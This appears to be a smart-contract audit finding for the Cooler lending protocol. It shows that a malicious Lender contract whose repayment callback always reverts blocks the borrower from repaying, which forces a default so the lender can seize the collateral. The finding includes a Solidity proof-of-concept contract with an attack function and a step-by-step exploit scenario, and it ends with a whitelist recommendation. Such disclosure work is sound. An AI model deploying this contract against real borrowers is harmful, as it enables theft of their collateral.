# Borrower Unable to repay
## Summary

A malicious ```Lender``` smart contract deliberately not implementing ```CoolerCallback```'s ```onRepay()``` function correctly will cause the loan to default always.  

## Vulnerability Detail

Consider the following **Lender** implementation.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import {SafeTransferLib} from "solmate/utils/SafeTransferLib.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {CoolerCallback} from "./CoolerCallback.sol";

interface ICooler {
    function clearRequest(uint256 reqID_, bool repayDirect_, bool isCallback_) external returns (uint256 loanID);
}

// only added some of the functions that are neccassary to showcase the attack vector
contract Lender is CoolerCallback {
    using SafeTransferLib for ERC20;

    constructor(address _factory) CoolerCallback(_factory) {}

    function _onRepay(uint256 loanID_, uint256 amount_) internal virtual override {
        revert("_onRepay");
    }

    function _onRoll(uint256 loanID_, uint256 newDebt, uint256 newCollateral) internal override {}

    function _onDefault(uint256 loanID_, uint256 debt, uint256 collateral) internal override {}

    function attack(ICooler _cooler, address _debtToken, uint256 _reqId) external {
        // assuming attacker has enough debt tokens to process clearRequest()
        ERC20(_debtToken).approve(address(_cooler), type(uint256).max);
        _cooler.clearRequest(_reqId, true, true);
    }
}

```
The only way for the borrower to get the collateral token back after **clearRequest()** is to repay the amount owed via **repayLoan()**. 

In ```repayLoan()```, when ```loan.callback = true```, then ```Cooler``` calls ```onRepay()``` on ```Lender``` contract.  However, a malicious ```Lender``` implementation like above will always cause ```onReapy()``` to revert making whole repayLoan() operation revert.

Example:

1 - Alice wants a loan for 1 month and calls  ```requestLoan()``` => 0(reqId)  on a **Cooler** that lends **DAI** 
2 - A malicious **Lender** using an implementation like above calls ```attack(0,DAI,coolerAddress)``` on **Lender** contract that will result in successful execution of ```clearRequest()``` on **Cooler** giving loan to Alice.
3 - Now after some time Alice wants to repay the loan, he calls ```repayLoan(0,someAmount)```, as ```loan.callback = true```, **Cooler** will call ```onRepay()``` on **Lender** that will revert making repay impossible every time.
4 - As the loan can not be repaid, a month will pass, the loan will expire, and anyone can call ```claimDefaulted()```.

Although, the **Lender** can transfer the ownership of the **loan** to another address via ```approveTransfer()```,  but he won't in this case as a bad actor.

## Impact
Lender forced the loan to become default to get collateral tokens for any reasons, hence owner loses collateral tokens.

Manual Review

## Recommendation
May be introduce some global whitelist for **smart contract lenders** in CoolerFactory.sol and check if lender is on whitelist if non-EOA during ```clearRequest()```.
